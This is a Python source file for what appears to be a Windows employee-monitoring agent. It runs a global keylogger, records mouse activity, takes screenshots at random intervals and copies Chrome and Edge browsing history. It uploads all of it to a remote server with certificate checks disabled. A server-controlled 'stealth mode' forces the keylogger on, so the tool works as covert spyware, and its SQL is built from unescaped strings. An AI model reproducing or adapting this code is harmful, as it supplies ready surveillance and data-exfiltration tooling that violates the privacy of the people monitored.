import sys
from mss import mss
import glob, os, threading, json, datetime, time, requests, random
from pynput import keyboard, mouse
from sys import argv
from win32api import GetUserName
from PIL import Image
import imagehash
import sqlite3

requests.packages.urllib3.disable_warnings()

strokes = []
mouse_strokes = []

ROOT_DIR = argv[1]
WEB_URL = "https://ems.cloudadda.com/"
STEALTH_MODE = False

class DbConnector():
	def __init__(self, name="engine.db", init = True):
		self.name = name
		if init:
			self.init()

	def init(self):
		try:
			self.conn = sqlite3.connect(self.name, check_same_thread=False, detect_types = sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
			return True
		except sqlite3.DatabaseError:
			return False

	def executemany(self, commands, commit : bool = False):
		try:
			for cmd in commands:
				self.conn.executescript(cmd)
			if commit:
				self.conn.commit()
		except sqlite3.OperationalError:
			pass

	def execute(self, command: str, commit : bool = False):
		try:
			self.conn.execute(command)
			if commit:
				self.conn.commit()
		except Exception as e:
			print("Error", e)

	def fetch_one(self, command: str):
		try:
			ftchr = self.conn.execute(command)
			return ftchr.fetchone()
		except sqlite3.OperationalError:
			return None

	def fetch_all(self, command: str):
		try:
			ftchr = self.conn.execute(command)
			return ftchr.fetchall()
		except sqlite3.OperationalError:
			return None

	def close(self):
		self.conn.close()

db_conn = DbConnector(name = f"{ROOT_DIR}\\engine.db")

if not os.path.isdir(ROOT_DIR + "\\user_data"):
	os.mkdir(ROOT_DIR + "\\user_data")

class KeyStrokeWriter(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.daemon = True

		self.date = str(datetime.date.today())
		self.start_time = datetime.datetime.now().strftime("%d-%m-%Y+%H-%M-%S")
		self.interval_time = 20
		self.kill = False
		print("Created Key stroke writer thread")

	def run(self):
		print("Started Key stroke writer thread")
		global strokes
		global mouse_strokes

		while True:
			with open(ROOT_DIR + "\\user_data\\{}\\{}.ks".format(self.date, self.start_time), 'a+') as fl:
				fl.writelines(strokes)
			strokes = []
			mouse_strokes = []
			if self.kill:
				print("stopped keyboard thread")
				break
			time.sleep(self.interval_time)

class key_stroke_listener(threading.Thread):
	def __init__(self, mode):
		threading.Thread.__init__(self)
		self.daemon = True

		self.mode = mode
		self.kill = False
		self.listener = keyboard.Listener(on_press=self.on_press)
		self.mouse_listener = mouse.Listener(
			on_move=self.mouse_on_move,
			on_click=self.mouse_on_click,
			on_scroll=self.mouse_on_scroll
		)
		self.writer = KeyStrokeWriter()
		print("Created keyboard listener thread")

	def mouse_on_move(self, x, y):
		global mouse_strokes
		mouse_strokes.append((x, y))

	def mouse_on_click(self, x, y, button, pressed):
		global mouse_strokes
		mouse_strokes.append((x, y, button, pressed))

	def mouse_on_scroll(self, x, y, dx, dy):
		global mouse_strokes
		mouse_strokes.append((x, y, dx, dy))

	def on_press(self, key):
		global strokes
		strokes.append(str(key).replace("Key.", "").replace("'", "")+"\n")

	def start_logger(self):
		self.mouse_listener.start()
		self.listener.start()
		self.writer.start()

	def run(self):
		print("Started keyboard listener thread")
		if self.mode in [1, 4]:
			self.start_logger()
			while True and not self.kill:
				time.sleep(2)
			self.listener.stop()
			self.mouse_listener.stop()
			self.writer.kill = True
			print("Stopped Key stroke listener")
		else:
			print("No need to run key stroke logger in this mode")

class screen_shot_capture(threading.Thread):
	def __init__(self, mode):
		threading.Thread.__init__(self)
		self.daemon = True
		self.kill = False
		self.mode = mode
		self.date = str(datetime.date.today())
		self.last_cap = datetime.datetime.now()
		print("Created screen shot capture thread")

	def remove_similar_images(self, img_dir, img_name, cutoff = 5):
		dir_imgs = os.listdir(img_dir)
		hash0 = imagehash.average_hash(Image.open(f'{img_dir}{img_name}'))
		for img in dir_imgs:
			if img != img_name:
				file_name = f'{img_dir}{img}'
				hash1 = imagehash.average_hash(Image.open(file_name)) 
				if hash0 - hash1 < cutoff:
					try:
						os.remove(file_name)
					except PermissionError:
						pass

	def capture_screen(self):
		img_name = f"""{datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")}.png"""
		img_dir = ROOT_DIR + f"""\\user_data\\{self.date}\\images\\"""
		file_name = f"{img_dir}{img_name}"
		with mss(mon=-1) as sct:
			sct.shot(output = file_name)
		self.remove_similar_images(img_dir = img_dir, img_name = img_name)

	def run(self):
		print("Started screen shot capture thread")
		if self.mode in [1, 2]:
			while True and not self.kill:
				self.capture_screen()
				time.sleep(random.randint(10, 30))
			print("Stopped css thread")
		else:
			print("No need to run screen shot capturer in this mode")

class app_usage_tracking(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.daemon = True
		self.date = str(datetime.date.today())
		self.opened_apps = {}
		try:
			data_file_name = ROOT_DIR + "\\user_data\\{}\\apps_usage.json".format(self.date)
			if os.path.isfile(data_file_name):
				with open(data_file_name) as fl:
					self.opened_apps = json.load(fl)
		except json.decoder.JSONDecodeError:
			self.opened_apps = {}
		self.last_send = datetime.datetime.now()
		self.interval_time = 5
		self.kill = False
		print("Created App usage tracker thread")

	def return_opened_apps(self):
		titles = []
		try:
			import ctypes
			EnumWindows = ctypes.windll.user32.EnumWindows
			EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
			GetWindowText = ctypes.windll.user32.GetWindowTextW
			GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
			IsWindowVisible = ctypes.windll.user32.IsWindowVisible

			def foreach_window(hwnd, lParam):
				if IsWindowVisible(hwnd):
					length = GetWindowTextLength(hwnd)
					buff = ctypes.create_unicode_buffer(length + 1)
					GetWindowText(hwnd, buff, length + 1)
					if buff.value != "" and buff.value not in titles:
						titles.append(buff.value)
				return True
			EnumWindows(EnumWindowsProc(foreach_window), 0)
		except ImportError:
			pass
		return titles

	def get_opened_apps(self):
		try:
			now = datetime.datetime.now()
			elapsed_time = (now - self.last_send).total_seconds()
			for app in self.return_opened_apps():
				if app in self.opened_apps.keys():
					self.opened_apps[app] += elapsed_time
				else:
					self.opened_apps[app] = elapsed_time
			with open(ROOT_DIR + '\\user_data\\{}\\apps_usage.json'.format(self.date), "w+") as fl:
				json.dump(dict(self.opened_apps), fl)
			self.last_send = now
			self.opened_apps = {k: v for k,v in sorted(self.opened_apps.items(), key=lambda kv: kv[1], reverse=True)}
		except Exception as e:
			print(e)

	def run(self):
		print("Started App usage tracker thread")
		while True and not self.kill:
			self.get_opened_apps()
			time.sleep(self.interval_time)
		print("Stopped app usage tracking thread")

class browser_track_history(threading.Thread):
	def __init__(self, mode):
		threading.Thread.__init__(self)
		self.daemon = True
		self.kill = False
		self.interval_time = 5
		lst_snd = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'browser_last'; ")
		if lst_snd and lst_snd[0]:
			self.last_send = datetime.datetime.strptime(lst_snd[0], "%Y-%m-%d %H:%M:%S")
		else:
			self.last_send = datetime.datetime.now()
		self.mode = mode
		self.db_loc = [
			f'C:\\Users\\{GetUserName()}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History',
			f'C:\\Users\\{GetUserName()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History',
		]
		print("Created browser history tracker thread")

	def update_browser_last(self):
		self.last_send = datetime.datetime.now()
		db_conn.execute(f""" INSERT INTO kv_pair(key, value) VALUES ('browser_last', '{self.last_send.strftime("%Y-%m-%d %H:%M:%S")}') """, commit = True)

	def get_browser_data(self):
		ret = []
		timestamp = (self.last_send.timestamp() + 11644473600) * (10**6)
		for loc in self.db_loc:
			con = DbConnector(loc, init = False)
			if con.init():
				results = con.fetch_all(f"select url, title, visit_count, datetime(last_visit_time/1e6-11644473600,'unixepoch','localtime') from urls WHERE last_visit_time > {timestamp} ORDER BY last_visit_time DESC")
				if results:
					for res in results:
						ret.append(res)
				con.close()
		return ret

	def run(self):
		print("Started browser history tracker thread")
		if self.mode in [1,4]:
			while True and not self.kill:
				results = self.get_browser_data()
				if results and len(results) > 0:
					try:
						for r in results:
							db_conn.execute(f"INSERT INTO browser_history(url, description, visit_time, visit_count) VALUES ('{r[0]}', '{r[1]}', '{r[3]}', {r[2]})")
						self.update_browser_last()
					except Exception as e:
						print(e)
					time.sleep(5)
				else:
					time.sleep(10)
			print("Stopped browser tracking history thread")
		else:
			print("No need to run browser history tracker in this mode")

class UserClient(threading.Thread):
	def __init__(self, mode = 4, interval_time = 5):
		threading.Thread.__init__(self)
		self.daemon = True
		self.date = str(datetime.date.today())
		if not os.path.isdir(ROOT_DIR + '\\user_data\\' + self.date):
			os.mkdir(ROOT_DIR + '\\user_data\\{}'.format(self.date))
			os.mkdir(ROOT_DIR + '\\user_data\\{}\\images'.format(self.date))
		self.start_time = datetime.datetime.now()
		self.interval_time = interval_time
		self.exit_time = datetime.datetime.now()
		self.config = json.load(open(ROOT_DIR + "\\config.json"))
		self.run_tasks = {}
		self.max_interval_idle = 20
		self.idle_time = 0

		self.mode = mode
		self.get_runner_tasks()
		self.kill = False

		self.init_db()

		print("Started User Monitoring")

	def init_db(self):
		db_conn.execute("UPDATE user_active_status SET active = 0;", commit = True)
		db_conn.executemany(commands = [
			f""" INSERT INTO user_active_status (start_time, end_time, mode, active) VALUES ('{self.start_time}', '{self.exit_time}', {self.mode}, 1); """,
			f""" INSERT INTO kv_pair (key, value) VALUES('mode', '{self.mode}'); """,
			"""INSERT INTO kv_pair (key, value) VALUES('aut', '0') ON CONFLICT(key) DO UPDATE SET value='0';"""
		], commit = True)

	def get_runner_tasks(self):
		modes_tasks = [ ['css', 'ak', 'bth', 'aut'], ['css', 'aut'], ['aut'], ['ak', 'aut', 'bth'] ]
		if self.config['css'] and 'css' in modes_tasks[self.mode-1]:
			self.run_tasks['css'] = screen_shot_capture(mode = self.mode)
		if (self.config['ak'] or STEALTH_MODE) and 'ak' in modes_tasks[self.mode-1]:
			self.run_tasks['ak'] = key_stroke_listener(mode = self.mode)
		if self.config['bth'] and 'bth' in modes_tasks[self.mode-1]:
			self.run_tasks['bth'] = browser_track_history(mode = self.mode)
		if self.config['aut'] and 'aut' in modes_tasks[self.mode-1]:
			self.run_tasks['aut'] = app_usage_tracking()

	def add_usage_data(self):
		self.exit_time = datetime.datetime.now()
		db_conn.execute(
			f""" UPDATE user_active_status SET end_time = '{self.exit_time}' WHERE active = 1 and start_time = '{self.start_time}' and mode={self.mode}; """, commit = True
		)

	def kill_child_threads(self):
		for task in self.run_tasks:
			self.run_tasks[task].kill = True
			self.run_tasks[task].join()

	def is_working(self):
		global strokes
		if len(strokes) < 1 and len(mouse_strokes) < 1:
			self.idle_time += self.interval_time
		else:
			self.idle_time = 0
		if self.idle_time > self.max_interval_idle:
			print("Are you there?? Looks like you have been idle for the past few minutes")
			db_conn.execute("UPDATE kv_pair SET value = 1 WHERE key = 'aut';", commit = True)
			st = time.perf_counter()
			act = False
			while time.perf_counter() - st < 25 and not act:
				val = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'aut';")
				if val and int(val[0]) == 0:
					self.idle_time = 0
					act = True
					print("fine you are")
					return True
				time.sleep(1)
			if not act:
				print("nope you aren't")
				db_conn.execute("UPDATE kv_pair SET value=0 WHERE key = 'aut';", commit = True)
				return False
		return True

	def check_idle(self):
		global strokes
		global mouse_strokes
		if STEALTH_MODE and self.mode == 4:
			if len(strokes) > 0 or len(mouse_strokes) > 0:
				self.kill = True

	def run(self):
		print("IN {} mode".format(['Working', "Conference", "Call", "Idle / Personal Work"][self.mode-1]))
		for task in self.run_tasks:
			self.run_tasks[task].start()
		while True:
			self.add_usage_data()
			if self.kill:
				self.kill_child_threads()
				print("stopped main thread with mode = {}".format(self.mode))
				break
			else:
				if self.mode == 1 and ( ( 'ak' in self.run_tasks ) and ( not self.is_working() ) ):
					self.kill = True
				self.check_idle()
				time.sleep(self.interval_time)
		print("Stopped user client thread")

class UserDataUploader(threading.Thread):
	def __init__(self, email, token):
		threading.Thread.__init__(self)
		self.daemon = True
		self.email = email
		self.token = token
		print("Started Image uploading service.")

	def add_browser_data(self):
		try:
			data = db_conn.fetch_all("SELECT * FROM browser_history")
			rm = True
			for db in data:
				query = f'mutation add_browser_usage{{ addBrowserUsage(email: "{self.email}", token: "{self.token}", url: "{db[0]}", description: {json.dumps(db[1])}, visitTime: "{db[2]}", visitCount: {str(db[3])}) {{ result }} }}'
				try:
					res = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
					if res.status_code == 200:
						resp = res.json()
						if  not ( ("data" in resp) and ("addBrowserUsage" in resp["data"]) and ("result" in resp["data"]["addBrowserUsage"]) and (resp["data"]["addBrowserUsage"]["result"])):
							rm = False
							break
				except:
					rm = False
					break
			if rm:
				db_conn.execute("DELETE FROM browser_history;", commit = True)
		except Exception as e:
			self.send_error(str(e), "add_browser_data")

	def add_key_strokes(self):
		dat_files = glob.glob(ROOT_DIR + "\\user_data\\*\\*.ks")
		for file in dat_files:
			try:
				ob = file.split("\\")
				dt = ob[-2]
				if dt != str(datetime.date.today()):
					file_name = ob[-1].split(".")[0]
					dl = False
					with open(file, "rb") as fle:
						try:
							req = requests.post(f"{WEB_URL}upload/{self.email}/ak/{file_name}/", files={"file": fle})
							if req.status_code == 200:
								if req.json()["status"] == 1:
									dl = True
							else:
								break
						except Exception as e:
							print(e)
							break
					if dl:
						os.remove(file)
			except Exception as e:
				self.send_error(f"Error uploading file {file}, {file_name}, {e}", "add_key_strokes")

	def upload_usage_data(self):
		data = db_conn.fetch_all("SELECT * FROM user_active_status WHERE active = 0 AND uploaded = 0;")
		data = [ 
			(
				_[0],
				(_[1] - _[0]).total_seconds(),
				_[2],
			) for _ in data 
		]
		rm = True
		for db in data:
			query = f"""mutation add_user_usage{{ addUserUsage(email: "{self.email}", token: "{self.token}", startTime: "{db[0].isoformat()}", workTime: {db[1]}, mode: {db[2]}) {{ result }} }}"""
			try:
				req = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
				if req.status_code == 200:
					resp = req.json()
					if  not ( ("data" in resp) and ("addUserUsage" in resp["data"]) and ("result" in resp["data"]["addUserUsage"]) and (resp["data"]["addUserUsage"]["result"])):
						rm = False
						break
				else:
					rm = False
					break
			except Exception as e:
				print(e)
				rm = False
				break
		if rm:
			db_conn.fetch_all("UPDATE user_active_status SET uploaded = 1 WHERE active = 0 AND uploaded = 0;")
			db_conn.execute(f"DELETE FROM user_active_status WHERE start_time < '{datetime.date.today()}' and uploaded = 1;", commit = True)

	def send_app_usage_data(self):
		apps_usage_file = glob.glob(ROOT_DIR + "\\user_data\\*\\apps_usage.json")
		for file in apps_usage_file:
			try:
				dt = file.split("\\")[-2]
				rm = False
				if dt != str(datetime.date.today()):
					with open(file, "r") as fl:
						dat = json.load(fl)
						query = f""" mutation add_app_usage{{ addAppUsage(email: "{self.email}", token: "{self.token}", appName: {json.dumps(list(dat.keys()))}, openTime: {json.dumps(list(dat.values()))}, date: "{dt}") {{ result }} }} """
						try:
							req = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
							if req.status_code == 200:
								resp = req.json()
								if  ("data" in resp) and ("addAppUsage" in resp["data"]) and ("result" in resp["data"]["addAppUsage"]) and (resp["data"]["addAppUsage"]["result"]):
									rm = True
						except Exception as e:
							print(e)
				if rm:
					os.remove(file)
			except Exception as e:
				self.send_error(str(e), "send_app_usage_data")

	def add_images(self):
		img_fls = glob.glob(ROOT_DIR + "\\user_data\\*\\images\\*.png")
		for file in img_fls:
			try:
				file_name = file.split("\\")[-1].split(".")[0]
				rm = False
				with open(file, "rb") as fle:
					try:
						req = requests.post(f"{WEB_URL}upload/{self.email}/css/{file_name}/", files={"file": fle})
						if req.status_code == 200:
							if req.json()["status"] == 1:
								rm = True
							else:
								break
						else:
							break
					except Exception as e:
						print(e)
						break
				if rm:
					os.remove(file)
			except Exception as e:
				self.send_error(str(e), "add_images")

	def send_error(self, error, where):
		try:
			query = f""" mutation add_user_error{{	addUserError(email:"{self.email}", error: {json.dumps(error)}, where: "{where}")	{{	result	}}	}} """
			try:
				req = requests.post(f"{WEB_URL}api/", json={"query": query})
			except Exception as e:
				print(e)
		except Exception as e:
			print(e)

	def run(self):
		while True:
			try:
				self.add_browser_data()
			except Exception as e:
				self.send_error(str(e), "add_browser_data")
			try:
				self.add_images()
			except Exception as e:
				self.send_error(str(e), "add_images")
			try:
				self.add_key_strokes()
			except Exception as e:
				self.send_error(str(e), "add_key_strokes")
			try:
				self.send_app_usage_data()
			except Exception as e:
				self.send_error(str(e), "app_usage_data")
			try:
				print("Please wait while syncing data to the cloud")
				self.upload_usage_data()
				print("Finished Uploading data to the server")
			except Exception as e:
				self.send_error(str(e), "upload_usage_data")
			time.sleep(random.randint(180, 600))

class ModeListener(threading.Thread):
	def __init__(self, email, token, mode = 4):
		threading.Thread.__init__(self)
		self.daemon = True
		self.mode = mode
		self.monitor_thread = UserClient(mode = self.mode)
		self.email = email
		self.token = token

	def stop_main_thread(self):
		self.monitor_thread.kill = True
		self.monitor_thread.join()

	def create_new_thread(self, mode):
		self.monitor_thread = UserClient(mode = mode)
	
	def start_new_thread(self):
		self.monitor_thread.start()

	def run(self):
		if self.email:
			self.monitor_thread.start()
			while True:
				cr = db_conn.fetch_one(""" SELECT value FROM kv_pair WHERE key='mode'; """)
				ch_mode = int(cr[0])
				if ch_mode != self.mode:
					self.stop_main_thread()
					self.mode = ch_mode
					self.create_new_thread(mode = self.mode)
					self.start_new_thread()

				if self.monitor_thread.kill: # The thread will only be killed iff the thread mentions it to do (in this desktop is unresponsive. So switching back to idle)
					db_conn.execute(f" UPDATE kv_pair SET value = '{1 if self.mode == 4 else 4}' WHERE key = 'mode' ", commit = True)
				time.sleep(1)
		else:
			print("The app is unregistered. Please download from the site again.")

if __name__ == "__main__":
	db_conn.executemany(commands = [
		""" CREATE TABLE IF NOT EXISTS kv_pair (key STRING primary key ON CONFLICT REPLACE, value STRING); """,
		""" CREATE TABLE IF NOT EXISTS user_active_status (start_time TIMESTAMP, end_time TIMESTAMP, mode INT, active BOOLEAN, uploaded BOOLEAN DEFAULT 0) """,
		""" CREATE TABLE IF NOT EXISTS browser_history (url TEXT, description TEXT, visit_time DATETIME, visit_count INT)""",
		f""" INSERT INTO kv_pair(key, value) VALUES ('browser_last', '{datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}') """
		], commit = True
	)
	email = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'email';")
	token = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'token';")
	if (email == None) or (token == None):
		db_conn.execute("INSERT INTO kv_pair (key, value) VALUES ('register', '0');", commit = True)
	else:
		email = email[0]
		token = token[0]
		query = f'query get_user_config{{ getUserConfig(email: "{email}", token: "{token}"){{ role, captureScreenShots, activeKeyLogger, browserTrackingHistory, appsUsageTracking, stealthMode }} }}'
		try:
			res = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
			if res.status_code == 200:
				json_data = res.json()
				if "data" in json_data and "getUserConfig" in json_data["data"] and (json_data['data']['getUserConfig']):
					resp = json_data['data']['getUserConfig']
					config = {
						"role": resp['role'], 
						"css": resp['captureScreenShots'], 
						"ak": resp['activeKeyLogger'], 
						"bth": resp['browserTrackingHistory'], 
						"aut": resp['appsUsageTracking'], 
						"sm": resp['stealthMode'] 
					}
					with open(ROOT_DIR + "\\config.json", "w+") as fl:
						json.dump(config, fl)
		except Exception as e:
			print(e)
		if os.path.isfile(ROOT_DIR + "\\config.json"):
			with open(ROOT_DIR + "\\config.json") as fl:
				config_data = json.load(fl)
			STEALTH_MODE = True if config_data["sm"] else False
			db_conn.execute(""" UPDATE kv_pair SET value = 1 WHERE key = 'register'; """)
			image_uploader_thread = UserDataUploader(email, token)
			md_lstn_thread = ModeListener(mode = 4, email = email, token = token)
			image_uploader_thread.start()
			md_lstn_thread.start()
			while True:
				time.sleep(1)
		else:
			sys.exit()